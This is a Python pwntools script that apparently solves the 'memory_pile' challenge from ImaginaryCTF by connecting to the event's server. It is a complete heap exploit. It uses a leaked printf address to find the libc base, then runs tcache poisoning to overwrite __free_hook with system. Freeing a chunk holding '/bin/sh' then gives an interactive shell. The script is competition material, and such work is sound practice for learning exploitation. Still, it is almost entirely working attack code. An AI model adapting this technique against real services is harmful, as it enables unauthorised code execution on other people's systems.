from pwn import *
from rpyc import lib

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"

# io = process('./memory_pile')
# io = gdb.debug("./memory_pile", "c")
io = remote("chal.imaginaryctf.org", 42007)

io.recvuntil(b"I'll even give you a present, if you manage to unwrap it...\n")
printf = int(io.recvlineS().strip(), 16)
libc_base = printf - 0x64F00
print(hex(libc_base))
__free_hook = libc_base + 0x3ED8E8
system = libc_base + 0x4F4E0


def acquire(i):
    io.sendlineafter(b"Choose wisely > ", "1")
    io.sendlineafter(b"With great power comes great responsibility > ", str(i))


def release(i):
    io.sendlineafter(b"Choose wisely > ", "2")
    io.sendlineafter(b"With great power comes great responsibility > ", str(i))


def fill(i, b):
    io.sendlineafter(b"Choose wisely > ", "3")
    io.sendlineafter(b"With great power comes great responsibility > ", str(i))
    io.sendlineafter(b"Let me have it, boss > ", b)


acquire(0)
acquire(1)
release(1)
release(0)
# tcache: 0 -> 1
fill(0, p64(__free_hook))  # write next pointer
acquire(2)  # put 0 to 2
acquire(0)  # now 0 is addr
fill(0, p64(system))  # write system to __free_hook
fill(2, "/bin/sh")
release(2)  # free("/bin/sh")
io.interactive()
